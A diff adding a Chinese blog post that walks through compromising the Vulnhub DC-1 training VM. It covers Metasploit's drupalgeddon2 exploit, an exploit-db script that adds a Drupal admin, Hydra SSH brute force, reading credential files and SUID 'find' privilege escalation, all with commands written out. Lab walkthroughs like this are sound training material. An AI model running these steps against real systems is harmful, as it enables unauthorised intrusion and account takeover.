@@ -1,0 +1,414 @@
+---
+title: Vulnhub靶机渗透测试
+author: 简文涛
+categories:
+  - Web
+tags:
+  - 渗透测试
+comments: true
+top: false
+img: 'https://i.loli.net/2020/05/16/nPTcQAf2o7xHz5p.png'
+abbrlink: 8808
+date: 2020-05-16 10:20:28
+updated:
+summary: Vulnhub是一个提供各种漏洞环境的靶场平台，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞。
+permalink:
+---
+## Vulnhub
+
+### 简介
+
+Vulnhub是一个提供各种漏洞环境的靶场平台，大部分环境是做好的虚拟机镜像文件，镜像预先设计了多种漏洞，需要使用VMware或者VirtualBox运行。每个镜像会有破解的目标，挑战的目标是获取操作系统的root权限和查看flag。
+
+### 部署方法
+
+官网：https://www.vulnhub.com
+
+1.在官网搜索你想要的镜像,然后下载【建议下载 (Mirror)版本】
+
+2.下载好后解压得到`.ova`的文件，右击选择VMware进行打开
+
+3.在弹出的框中，选择存放的位置，然后点击导入
+
+4.最后等待导入完成，然后启动该虚拟机就可以了
+
+## DC-1__drupal
+
+**靶机下载地址：**https://download.vulnhub.com/dc/DC-1.zip
+
+**靶机描述：**DC-1 是一个专门构建的易受攻击的实验室，旨在获得渗透测试领域的经验。共有五个flag，但最终目标是拿到root目录中的flag。
+
+### 一、信息收集
+
+运行部署好的虚拟机，提示需要账号密码，该靶机不提供密码需要自己去渗透提权
+
+![image-20200516125057852](https://i.loli.net/2020/05/16/NHTOKwQBoXLgEU8.png)
+
+**因不知道DC-1靶机的IP，所有我们需要将靶机和攻击机kali放在同一个局域网里面，将Kali的网络适配器使用`桥接模式`**
+
+#### 1.探测目标
+
+**方法一：使用arp-scan工具**
+
+探测同一区域中存活主机
+
+```bash
+$ sudo arp-scan -l
+
+-l 使用网络接口
+```
+
+![](https://i.loli.net/2020/05/16/TroRKx1gVv3hZF2.png)
+
+[kali之arp-scan](https://blog.csdn.net/weixin_43221560/article/details/90550294)
+
+**方法二：使用netdiscover工具**
+
+探测存活主机
+
+```bash
+$ sudo netdiscover -i eth0
+
+-i device 用于嗅探和注入数据包的网络接口
+```
+
+![](https://i.loli.net/2020/05/16/CKZuIEU3P9T4gqn.png)
+
+[netdiscover用法](https://manpages.debian.org/unstable/netdiscover/netdiscover.8.en.html)
+
+**方法三：使用nmap工具**
+
+```bash
+$ sudo ifconfig #查看kali的ip【192.168.0.103】
+$ nmap 192.168.0.0/24
+```
+
+#### 2.查看目标开放端口
+
+```bash
+$ nmap -sV -p- 192.168.0.119
+
+-sV 用来扫描目标主机和端口上运行的软件的版本
+-p- 扫描0-65535全部端口
+```
+
+![](https://i.loli.net/2020/05/16/b4VFOxylKc9h2wS.png)
+
+目标靶机开放了80端口,在浏览器打开该站点
+
+#### 3.查看网页相关信息
+
+使用浏览器插件`Wappalyzer`，这个插件可以检测网站的CMS，框架，服务器等信息，
+
+可以看到该网站使用CMS为`Drupal`，其实在网页界面和底部都能发现是Drupal
+
+![](https://i.loli.net/2020/05/16/FwIa8NtxdBA2JPi.png)
+
+
+
+### 二、漏洞查找与利用
+
+#### 1.漏洞查找
+
+使用Metasploit搜索Drupal
+
+```bash
+$ sudo msfdb init && msfconsole
+$ search Drupal
+```
+
+![](https://i.loli.net/2020/05/16/nOA53LzTF9KXe4D.png)
+
+![image-20200516185640948](https://i.loli.net/2020/05/16/KLMDfthcud8Ik6g.png)
+
+#### 2.漏洞利用
+
+优先选择上面查到模块的Rank为excellent并且时间较新的模块，这里我们使用第4个
+
+```bash
+$ use exploit/unix/webapp/drupal_drupalgeddon2 
+$ show options
+$ set RHOSTS 192.168.0.119
+$ exploit 或者 run
+#当出现“Meterpreter session 1 opened”说明利用成功
+```
+
+![](https://i.loli.net/2020/05/16/xjtqeUwfM5FpykP.png)
+
+![](https://i.loli.net/2020/05/16/HI5EX9xpeVTyBcr.png)
+
+[MSF之命令笔记篇](http://sh1yan.top/2019/07/28/MSF-Command-Notes/)
+
+### 三、Getshell
+
+#### 1.获取普通shell
+
+```bash
+meterpreter >shell
+ls
+```
+
+![](https://i.loli.net/2020/05/16/8gem543oQr6LZTc.png)
+
+发现有个`flag1.txt`，打开看一哈
+
+```bash
+$ cat flag1.txt
+Every good CMS needs a config file - and so do you.
+```
+
+翻译：每一个好的CMS都需要一个配置文件，你也一样。
+
+百度查到Drupal的默认配置文件为 `/var/www/sites/default/settings.php`
+
+[drupal7的目录结构及术语](https://www.iteye.com/blog/justcoding-1407697)
+
+```bash
+cat /var/www/sites/default/settings.php
+```
+
+![](https://i.loli.net/2020/05/16/rRTl5Ng4yoJDX1L.png)
+
+配置文件中看到了`flag2`
+
+翻译:蛮力和字典攻击不行，唯一方法是获得访问权限(你将需要访问的)。你能用这些凭证做什么?
+
+同时，还有获得了数据库账号和密码
+
+```
+'username' => 'dbuser',
+'password' => 'R0ck3t',
+```
+#### 2.获取交互式shell
+
+使用python反弹一个交互式shell，然后我们登陆数据库
+
+```bash
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+
+$ mysql -udbuser -p
+Enter password:R0ck3t
+```
+
+![](https://i.loli.net/2020/05/17/ugkBJPU3d7Hzlnv.png)
+
+查看数据库,在drupaldb库users表中发现admin用户
+
+```mysql
+mysql> show databases; #[drupaldb]
+mysql> use drupaldb;
+mysql> show tables; #[users]
+mysql> select * from users;
+```
+
+![](https://i.loli.net/2020/05/17/SGaPZVomDkRLpA2.png)
+
+![image-20200517095356679](https://i.loli.net/2020/05/17/PFKyEd4zqncsVmC.png)
+
+可以看到admin用户的密码被加密了的，但是我们可以想办法修改密码或新增一个admin权限的用户
+
+**方法一：**修改admin用户的密码
+
+使用Drupal对数据库的加密方法，生成一个新密码，然后把新的密码更新到admin用户
+
+加密脚本位置在`/var/www/scripts/password-hash.sh`下
+
+参考：[忘记Drupal的管理员密码的解决办法](http://drupalchina.cn/node/2128)
+
+```bash
+$ php scripts/password-hash.sh jwt  #生成新密码jwt
+# hash:$S$D5HTFVPccZrLCEJ7CzFvPvvh5zlSRhjF6E7AZ0Wg0R.cDGjgChoX
+
+mysql> update drupaldb.users set pass="$S$D5HTFVPccZrLCEJ7CzFvPvvh5zlSRhjF6E7AZ0Wg0R.cDGjgChoX" where name="admin";
+```
+
+![image-20200517101339236](https://i.loli.net/2020/05/17/Ihmut4gaZNVyBX5.png)
+
+![image-20200517101410076](https://i.loli.net/2020/05/17/q6T9HNAlZUmwFsh.png)
+
+**方法二：**新增一个admin权限的用户
+
+在exploitdb中有一个针对Drupal 7版本的攻击脚本，可以增加一个admin权限的用户账号
+
+
+
+查看Drupal版本,确定Drupal版本为7.24
+
+```bash
+$ cat /var/www/includes/bootstrap.inc | grep VERSION
+```
+
+![image-20200517130545021](https://i.loli.net/2020/05/17/2TnfzyQHIAXkidc.png)
+
+```bash
+msf > searchsploit drupal
+```
+
+![](https://i.loli.net/2020/05/17/fvSrwXp6Al5BmHz.png)
+
+攻击脚本适用于7.31以下，所以适合7.24版本,可以利用漏洞增加admin权限用户
+
+增加有admin权限的用户：admin1/admin1
+
+```bash
+python /usr/share/exploitdb/exploits/php/webapps/34992.py -t http://192.168.0.100 -u admin1 -p admin1
+```
+
+输入用户名/密码【admin/jwt或者admin1/admin1】，尝试登陆 
+
+![](https://i.loli.net/2020/05/17/2ugc4GCWK6pZHfQ.png)
+
+成功登陆
+
+![](https://i.loli.net/2020/05/17/2yNEYavswqhoxJg.png)
+
+
+
+
+
+在后台左上角的`Find content`中发现flag3
+
+![image-20200517102352344](https://i.loli.net/2020/05/17/Pl3E8IFh4SDb6gj.png)
+
+
+
+flag3的信息中提到了passwd和shadow,很明显就是`/etc/passwd和/etc/shadow`，还提到了`find、perms、-exec`，这几个是提权用的。
+
+我们来查看哈/`etc/passwd和/etc/shadow` 的内容
+
+> /etc/passwd 是一个纯文本文件。它存储用户帐户信息。它包含系统帐户的列表，为每个帐户提供一些有用的信息，如用户 ID、组 ID、主目录、shell 等
+>
+>  [/etc/passwd详情](https://www.cyberciti.biz/faq/understanding-etcpasswd-file-format/)
+>
+> etc/shadow是/etc/passwd的影子文件，存有密码信息
+
+```bash
+$ cat /etc/passwd
+或者
+$ tail -3 /etc/passwd  #为了方便截图，只显示文件的最后三行
+
+$ cat /etc/shadow #权限不够查看失败
+```
+
+![](https://i.loli.net/2020/05/17/HonD8RieWJgrS1p.png)
+
+发现有个叫`flag4`的账号，但是查看使用`/etc/shadow`失败，但是前面nmap扫描的时候发现了 ssh 服务，现在又发现了 flag4 用户，所以尝试使用`hydra `进行密码的暴力猜解
+
+```bash
+sudo hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz 192.168.0.100 ssh
+或者
+sudo hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.0.100
+
+#ip变成192.168.0.100，是应为我重启了，靶机ip变了
+-l  指定破解的用户
+-P  指定密码字典
+ssh://ip 指定使用协议和ip地址
+```
+
+![](https://i.loli.net/2020/05/16/Kb8FI9HYGaqLfkM.png)
+
+[暴力密码在线破解工具Hydra详解](http://www.ha97.com/5186.html)
+
+使用得到用户名密码【 flag4/orange】，登录靶机
+
+![](https://i.loli.net/2020/05/16/6clWopZR2OfKEQb.png)
+
+也可以用kali直接远程连接
+
+```bash
+ssh flag4@192.168.0.100
+```
+
+![](https://i.loli.net/2020/05/16/V3eb5srdkzi2fZF.png)
+
+```bash
+$ ls
+$ cat flag4.txt
+```
+
+![](https://i.loli.net/2020/05/17/qmtczhZHVaik3xE.png)
+
+flag4提示flag在root目录下，在`/root`下发现`thefinalflag.txt`，但是没有读取的权限
+
+![](https://i.loli.net/2020/05/17/wLYZhdx39znRMGv.png)
+
+### 四、提升权限
+
+根据flag3和flag4都提到了find,所以下面我们利用find文件提权
+
+参考：[Linux下用SUID提权](https://blog.csdn.net/qq_36119192/article/details/84872644)、[linux提权-SUID提权](https://blog.csdn.net/qq_40510246/article/details/95939784?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase)、[find命令之exec](https://www.cnblogs.com/huchong/p/9961625.html)
+
+> SUID可以让调用者以文件拥有者的身份运行该文件，所以我们利用SUID提权的思路就是运行root用户所拥有的SUID的文件，那么我们运行该文件的时候就得获得root用户的身份了。
+
+```bash
+#查找具有root权限的SUID的文件
+$ find / -perm -u=s -type f 2>/dev/null
+```
+
+![](https://i.loli.net/2020/05/17/oBHRnfd6O9ZrS38.png)
+
+可以看到find命令具有SUID权限，如果find以SUID权限运行，所有通过find执行的命令都会以root权限运行。
+
+```bash
+$ touch jwt
+#查找根目录下名为jwt的文件并执行shell
+$ find / -name jwt -exec "/bin/sh" \;
+
+#-exec 参数后面跟的是command命令，它的终止是以;为结束标志的，所以这句命令后面的分号是不可缺少的，考虑到各个系统中分号会有不同的意义，所以在分号前面加反斜杠。
+```
+
+![image-20200517113343425](https://i.loli.net/2020/05/17/EGqIUHOpNa6nmVg.png)
+
+可以看到已经成功提权拿到root shell，接下来就来查看最终的flag吧
+
+```bash
+cd /root
+ls
+cat thefinalflag.txt
+```
+
+![image-20200517113640702](https://i.loli.net/2020/05/17/yrWDTYFC6hRvUsu.png)
+
+到这里我们就成功获取到了5个flag,并成功走完了整个渗透流程
+
+### 五、总结
+
+1.扫描局域网主机
+
+`sudo arp-scan -l` 参考：[kali之arp-scan](https://blog.csdn.net/weixin_43221560/article/details/90550294)
+
+`sudo netdiscover -i eth0` 参考：[netdiscover用法](https://manpages.debian.org/unstable/netdiscover/netdiscover.8.en.html)
+
+`nmap 192.168.0.0/24`
+
+2.MSF使用
+
+参考：[MSF之命令笔记篇](http://sh1yan.top/2019/07/28/MSF-Command-Notes/)
+
+3.hydra爆破
+
+`sudo hydra -l flag4 -P /usr/share/wordlists/rockyou.txt.gz ssh://192.168.0.100`
+
+参考：[暴力密码在线破解工具Hydra详解](http://www.ha97.com/5186.html)
+
+4.suid提权
+
+参考：[Linux下用SUID提权](https://blog.csdn.net/qq_36119192/article/details/84872644)、[linux提权-SUID提权](https://blog.csdn.net/qq_40510246/article/details/95939784?utm_medium=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase&depth_1-utm_source=distribute.pc_relevant.none-task-blog-BlogCommendFromMachineLearnPai2-1.nonecase)、[find命令之exec](https://www.cnblogs.com/huchong/p/9961625.html)
+
+
+
+## 赞助💰
+
+如果你觉得对你有帮助，你可以赞助我一杯冰可乐吧！
+
+<table>
+  <tbody>
+     <tr>
+         <td style="text-align:center;">支付宝支付</td>
+         <td style="text-align:center;">微信支付</td>
+     </tr>
+   <tr>
+    <td style="text-align:center;" ><img width="200" src="https://jwt1399.top/medias/reward/alipay.png"></td>    
+      <td style="text-align:center;"><img width="200" src="https://jwt1399.top/medias/reward/wechat.png"></td>     
+  </tr>
+</tbody></table>
